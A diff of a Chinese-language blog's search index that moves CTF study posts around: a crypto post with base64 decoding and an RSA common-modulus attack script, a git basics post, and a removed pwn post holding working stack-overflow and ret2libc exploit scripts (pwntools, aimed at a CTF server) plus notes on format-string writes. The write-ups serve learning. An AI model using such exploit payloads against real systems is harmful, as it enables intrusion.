@@ -1,41 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Crypto:来自摸鱼哥的浅学</title>
-    <url>/2022/09/04/Crypto-%E6%9D%A5%E8%87%AA%E6%91%B8%E9%B1%BC%E5%93%A5%E7%9A%84%E6%B5%85%E5%AD%A6/</url>
-    <content><![CDATA[<p>来自一个学不明白堆的菜的研究：</p>
-<span id="more"></span>
-<h3 id="工具一把梭">工具一把梭</h3>
-<p>这里需要一个小工具，叫ciphey，命令行调用即可对密文进行解密，挺方便的。具体的安装方法csdn就有，有一些地方需要注意一下，但还是很快能安装完毕。安装完毕后使用命令行调用：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ciphey -t &quot;需要解密的密文&quot;</span><br></pre></td></tr></table></figure>
-<p>直接就返回明文以及具体的解答方式。</p>
-<p>像这样：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a528.png" alt=""></p>
-<p>经典给出一堆乱码，像这种：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a527.jpg" alt=""></p>
-<h3 id="base64以及凯撒等简单密码">base64以及凯撒等简单密码</h3>
-<p>这里装好相应的库，对着密文一通decode就能（大概？解出最最简单的题目了</p>
-<p>比如：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;************************************&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;NSSCTF&#123;&#x27;</span> + base64.b16encode(base64.b32encode(base64.b64encode(var.encode()))) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">小明不小心泄露了源码，输出结果为：4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D，你能还原出var的正确结果吗？</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>这种就看着加密方式一步一步逆回去咯：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ans=<span class="string">&quot;4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D&quot;</span></span><br><span class="line"><span class="comment">#var=base64.decode(base64.b64decode(base64.b32decode(base64.b16decode(ans))),var)</span></span><br><span class="line">var2=base64.b64decode(base64.b32decode(base64.b16decode(ans)))</span><br><span class="line">var2=var2.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NSSCTF&#123;&quot;</span>+var2+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>当然如果遇到纯粹的凯撒，那直接工具一把梭也是可以的</p>
-<h3 id="RSA以及其共模攻击">RSA以及其共模攻击</h3>
-<p>这里就涉及一点数论知识了，还没有学习太深入，只能照葫芦画瓢抄一抄简单脚本：</p>
-<p>这是题目附件：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag  = <span class="string">&#x27;***************&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e1 = getPrime(<span class="number">32</span>)</span><br><span class="line">e2 = getPrime(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2= &#x27;</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e1= &#x27;</span> +<span class="built_in">str</span>(e1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e2= &#x27;</span>+<span class="built_in">str</span>(e2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1= 100156221476910922393504870369139942732039899485715044553913743347065883159136513788649486841774544271396690778274591792200052614669235485675534653358596366535073802301361391007325520975043321423979924560272762579823233787671688669418622502663507796640233829689484044539829008058686075845762979657345727814280</span></span><br><span class="line"><span class="comment">#flag2= 86203582128388484129915298832227259690596162850520078142152482846864345432564143608324463705492416009896246993950991615005717737886323630334871790740288140033046061512799892371429864110237909925611745163785768204802056985016447086450491884472899152778839120484475953828199840871689380584162839244393022471075</span></span><br><span class="line"><span class="comment">#e1= 3247473589</span></span><br><span class="line"><span class="comment">#e2= 3698409173</span></span><br><span class="line"><span class="comment">#n= 103606706829811720151309965777670519601112877713318435398103278099344725459597221064867089950867125892545997503531556048610968847926307322033117328614701432100084574953706259773711412853364463950703468142791390129671097834871371125741564434710151190962389213898270025272913761067078391308880995594218009110313</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>解题脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#from xenny.ctf.crypto.modern.asymmetric.rsa import same_module</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag1=<span class="number">100156221476910922393504870369139942732039899485715044553913743347065883159136513788649486841774544271396690778274591792200052614669235485675534653358596366535073802301361391007325520975043321423979924560272762579823233787671688669418622502663507796640233829689484044539829008058686075845762979657345727814280</span></span><br><span class="line"></span><br><span class="line">flag2=<span class="number">86203582128388484129915298832227259690596162850520078142152482846864345432564143608324463705492416009896246993950991615005717737886323630334871790740288140033046061512799892371429864110237909925611745163785768204802056985016447086450491884472899152778839120484475953828199840871689380584162839244393022471075</span></span><br><span class="line"></span><br><span class="line">e1= <span class="number">3247473589</span></span><br><span class="line">e2= <span class="number">3698409173</span></span><br><span class="line"></span><br><span class="line">n=<span class="number">103606706829811720151309965777670519601112877713318435398103278099344725459597221064867089950867125892545997503531556048610968847926307322033117328614701432100084574953706259773711412853364463950703468142791390129671097834871371125741564434710151190962389213898270025272913761067078391308880995594218009110313</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>):  <span class="comment">#共模攻击函数</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e1,e2:&quot;</span>,e1,e2)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;mpz:&quot;</span>,s)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def de(c, e, n): #因为此时的m不是真正的m，而是m^k，所以对m^k进行爆破</span></span><br><span class="line"><span class="comment">#     k = 0</span></span><br><span class="line"><span class="comment">#     while k&lt;1000: #指定k小于1000</span></span><br><span class="line"><span class="comment">#         mk = c + n*k</span></span><br><span class="line"><span class="comment">#         flag, true1 = gmpy2.iroot(mk, e)  #返回的第一个数值为开方数，第二个数值为布尔型，可整除为true，可自行测试</span></span><br><span class="line"><span class="comment">#         if True == true1:</span></span><br><span class="line"><span class="comment">#             # print(libnum.n2s(int(flag)))</span></span><br><span class="line"><span class="comment">#             return flag</span></span><br><span class="line"><span class="comment">#         k += 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for e1 in range(2,e1e2):</span></span><br><span class="line"><span class="comment">#     if e1e2%e1==0:         #爆破可整除的e</span></span><br><span class="line"><span class="comment">#         e2=e1e2//e1</span></span><br><span class="line"><span class="comment">#         c=rsa_gong_N_def(e1, e2, c1, c2, n)</span></span><br><span class="line"><span class="comment">#         e=gmpy2.gcd(e1,e2)</span></span><br><span class="line"><span class="comment">#         m1=de(c, e, n)</span></span><br><span class="line"><span class="comment">#         if m1:  #指定输出m1</span></span><br><span class="line"><span class="comment">#             print(libnum.n2s(int(m1)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#m = same_module.attack(n, e1, e2, flag1, flag2)</span></span><br><span class="line">m=rsa_gong_N_def(e1,e2,flag1,flag2,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure>
-<p>中间被注释掉的部分是为了处理更难级别的题目，但在此题暂时还用不上。</p>
-<p>暂时先到这里吧，RSA其中原理以及逆元还不是很清楚，摆烂（</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg" alt=""></p>
-]]></content>
-      <tags>
-        <tag>密码学</tag>
-        <tag>基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Java入门基础</title>
     <url>/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p>Java初学，包含使用IDEA创建文件，基本程序等等</p>
@@ -129,63 +94,6 @@
       </tags>
   </entry>
   <entry>
-    <title>git的基本用法</title>
-    <url>/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<p>git命令行的基本用法：</p>
-<span id="more"></span>
-<h3 id="Git-commit">Git commit</h3>
-<p>提交内容，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cl.jpg" alt=""></p>
-<p>输入指令:<strong>git commit</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cm.jpg" alt=""></p>
-<h3 id="Git-branch">Git branch</h3>
-<p>形成一个新的分支，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cn.jpg" alt=""></p>
-<p>输入指令：<strong>git branch newImage</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5co.jpg" alt=""></p>
-<p>输入指令：<strong>git checkout newImage + git commit</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cp.jpg" alt=""></p>
-<h3 id="Git-merge">Git merge</h3>
-<p>合并分支，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cq.jpg" alt=""></p>
-<p>输入指令<strong>git merge bugFix</strong>,此时会把bugFix包起来，注意当前指针指向Main</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cr.jpg" alt=""></p>
-<p>此时调整指针到bugFix，再合并到main分支即可，命令行：<strong>git checkout bugFix + git merge main</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cs.jpg" alt=""></p>
-<h3 id="Git-rebase">Git rebase</h3>
-<p>由并行状态合并为线性状态，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5ct.jpg" alt=""></p>
-<p>输入指令：<strong>git rebase main</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cw.jpg" alt=""></p>
-<p>输入指令：<strong>git checkout main</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cu.jpg" alt=""></p>
-<p><strong>git rebase bugFix</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cv.jpg" alt=""></p>
-<h3 id="Git-branch-f-XXX-HEAD-n">Git branch -f XXX HEAD~n</h3>
-<p>修改main分支到前几次的提交状态，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cP.jpg" alt=""></p>
-<p>指令<strong>git branch -f main HEAD~3</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cQ.jpg" alt=""></p>
-<h3 id="Git-cherry-pick">Git cherry-pick</h3>
-<p>将后交的状态复制到main分支中，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cR.jpg" alt=""></p>
-<p>指令<strong>git cherry-pick c2 c4</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cS.jpg" alt=""></p>
-<h3 id="Git-rebase-2">Git rebase</h3>
-<p>将已有的提交记录复制一份，可以自行选择顺序，分支，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cT.jpg" alt=""></p>
-<p>指令<strong>git rebase -i HEAD~4</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cU.jpg" alt=""></p>
-]]></content>
-      <categories>
-        <category>乱七八糟的东东</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>RSA学习</title>
     <url>/2022/11/01/RSA%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h3 id="RSA学习">RSA学习</h3>
@@ -264,82 +172,95 @@
       </tags>
   </entry>
   <entry>
-    <title>pwn:从一窍不通到入门的门前</title>
-    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
-    <content><![CDATA[<p>基础pwn例题，栈溢出，格式化字符串。</p>
+    <title>Crypto:来自摸鱼哥的浅学</title>
+    <url>/2022/09/04/Crypto-%E6%9D%A5%E8%87%AA%E6%91%B8%E9%B1%BC%E5%93%A5%E7%9A%84%E6%B5%85%E5%AD%A6/</url>
+    <content><![CDATA[<p>来自一个学不明白堆的菜的研究：</p>
 <span id="more"></span>
-<h3 id="栈溢出例题">栈溢出例题</h3>
-<h4 id="hello-pwn">hello_pwn</h4>
-<p>来源：攻防世界</p>
-<p>首先先checksec：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51X.png" alt=""></p>
-<p>再看伪代码：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51Y.png" alt=""></p>
-<p>再看偏移量：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51Z.png" alt=""></p>
-<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="level3">level3</h4>
-<p>来源：攻防世界</p>
-<p>checksec:</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a520.png" alt=""></p>
-<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a521.png" alt=""></p>
-<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
-<p>因此要找到system函数，知识点(搬运自wiki)</p>
-<ul>
-<li>system 函数属于 libc，而 <a href="http://libc.so">libc.so</a> 动态链接库中的函数之间相对偏移是固定的。</li>
-<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
-<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
-</ul>
-<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a522.png" alt=""></p>
-<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a523.png" alt=""></p>
-<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="格式化字符串">格式化字符串</h3>
-<p>基本原理以及利用方法在wiki上有解释。</p>
-<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
-<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
-<p>%d:打印成数字，只能泄露栈本身内容</p>
-<p>%x:打印成16进制，只能泄露栈本身内容</p>
-<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
-<p>%c:输出字符</p>
-<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
-<p>%n:写入4个字节，写入1–&gt;0000 0001</p>
-<p>%hn:写入两个字节，写入1–&gt;0001</p>
-<p>%hhn:写入单个字节,写入1–&gt;01</p>
-<h3 id="整数溢出">整数溢出</h3>
-<p>啥都没有，因为懒得搞，搞堆去了</p>
+<h3 id="工具一把梭">工具一把梭</h3>
+<p>这里需要一个小工具，叫ciphey，命令行调用即可对密文进行解密，挺方便的。具体的安装方法csdn就有，有一些地方需要注意一下，但还是很快能安装完毕。安装完毕后使用命令行调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ciphey -t &quot;需要解密的密文&quot;</span><br></pre></td></tr></table></figure>
+<p>直接就返回明文以及具体的解答方式。</p>
+<p>像这样：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a528.png" alt=""></p>
+<p>经典给出一堆乱码，像这种：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a527.jpg" alt=""></p>
+<h3 id="base64以及凯撒等简单密码">base64以及凯撒等简单密码</h3>
+<p>这里装好相应的库，对着密文一通decode就能（大概？解出最最简单的题目了</p>
+<p>比如：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;************************************&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;NSSCTF&#123;&#x27;</span> + base64.b16encode(base64.b32encode(base64.b64encode(var.encode()))) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">小明不小心泄露了源码，输出结果为：4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D，你能还原出var的正确结果吗？</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这种就看着加密方式一步一步逆回去咯：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ans=<span class="string">&quot;4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D&quot;</span></span><br><span class="line"><span class="comment">#var=base64.decode(base64.b64decode(base64.b32decode(base64.b16decode(ans))),var)</span></span><br><span class="line">var2=base64.b64decode(base64.b32decode(base64.b16decode(ans)))</span><br><span class="line">var2=var2.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NSSCTF&#123;&quot;</span>+var2+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>当然如果遇到纯粹的凯撒，那直接工具一把梭也是可以的</p>
+<h3 id="RSA以及其共模攻击">RSA以及其共模攻击</h3>
+<p>这里就涉及一点数论知识了，还没有学习太深入，只能照葫芦画瓢抄一抄简单脚本：</p>
+<p>这是题目附件：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag  = <span class="string">&#x27;***************&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e1 = getPrime(<span class="number">32</span>)</span><br><span class="line">e2 = getPrime(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2= &#x27;</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e1= &#x27;</span> +<span class="built_in">str</span>(e1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e2= &#x27;</span>+<span class="built_in">str</span>(e2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1= 100156221476910922393504870369139942732039899485715044553913743347065883159136513788649486841774544271396690778274591792200052614669235485675534653358596366535073802301361391007325520975043321423979924560272762579823233787671688669418622502663507796640233829689484044539829008058686075845762979657345727814280</span></span><br><span class="line"><span class="comment">#flag2= 86203582128388484129915298832227259690596162850520078142152482846864345432564143608324463705492416009896246993950991615005717737886323630334871790740288140033046061512799892371429864110237909925611745163785768204802056985016447086450491884472899152778839120484475953828199840871689380584162839244393022471075</span></span><br><span class="line"><span class="comment">#e1= 3247473589</span></span><br><span class="line"><span class="comment">#e2= 3698409173</span></span><br><span class="line"><span class="comment">#n= 103606706829811720151309965777670519601112877713318435398103278099344725459597221064867089950867125892545997503531556048610968847926307322033117328614701432100084574953706259773711412853364463950703468142791390129671097834871371125741564434710151190962389213898270025272913761067078391308880995594218009110313</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>解题脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#from xenny.ctf.crypto.modern.asymmetric.rsa import same_module</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag1=<span class="number">100156221476910922393504870369139942732039899485715044553913743347065883159136513788649486841774544271396690778274591792200052614669235485675534653358596366535073802301361391007325520975043321423979924560272762579823233787671688669418622502663507796640233829689484044539829008058686075845762979657345727814280</span></span><br><span class="line"></span><br><span class="line">flag2=<span class="number">86203582128388484129915298832227259690596162850520078142152482846864345432564143608324463705492416009896246993950991615005717737886323630334871790740288140033046061512799892371429864110237909925611745163785768204802056985016447086450491884472899152778839120484475953828199840871689380584162839244393022471075</span></span><br><span class="line"></span><br><span class="line">e1= <span class="number">3247473589</span></span><br><span class="line">e2= <span class="number">3698409173</span></span><br><span class="line"></span><br><span class="line">n=<span class="number">103606706829811720151309965777670519601112877713318435398103278099344725459597221064867089950867125892545997503531556048610968847926307322033117328614701432100084574953706259773711412853364463950703468142791390129671097834871371125741564434710151190962389213898270025272913761067078391308880995594218009110313</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>):  <span class="comment">#共模攻击函数</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e1,e2:&quot;</span>,e1,e2)</span><br><span class="line">    s = 